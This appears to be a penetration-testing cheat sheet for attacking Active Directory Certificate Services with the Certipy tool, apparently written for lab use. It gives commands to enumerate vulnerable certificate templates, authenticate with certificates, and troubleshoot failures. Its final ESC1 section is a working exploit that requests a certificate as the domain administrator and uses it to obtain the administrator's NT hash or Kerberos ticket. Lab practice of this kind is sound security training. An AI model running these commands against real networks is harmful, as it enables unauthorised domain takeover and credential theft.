## Enumerate CA and template configuration

**Run in:** Kali. **Requires:** A compatible Certipy release and an account that can read the relevant directory/CA information.

```bash
certipy find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout
```

**What the result establishes:** Read CA/template properties and effective enrollment rights, then evaluate the complete certificate-authentication path.

**Next check:** Verify effective enrollment rights and the full CA/template/authentication chain before choosing a certificate operation.

## Authenticate with a certificate

**Kali**

```bash
certipy auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
```

DNS, DC time, and certificate identity must match the lab.

## If it fails

| Symptom | Check |
| --- | --- |
| A vulnerability label lacks the required enrollment or identity-mapping condition | A vulnerability label is not a universal exploit guarantee; template policy, CA settings, mapping enforcement and certificate identity all matter. |
| LDAP timeout | Check DC_IP, routing, and LDAP reachability. The CA and DC may be different hosts. |
| Kerberos clock skew | Compare your time with the DC, including date and timezone; internet time may differ from lab time. |

### ESC1 — template allows SAN + client auth

**AD Certificate Services: Quick Reference**

```bash
# request a cert AS the domain admin
certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -dc-ip $DC
# authenticate with the cert -> get NT hash / TGT
certipy auth -pfx administrator.pfx -dc-ip $DC
```
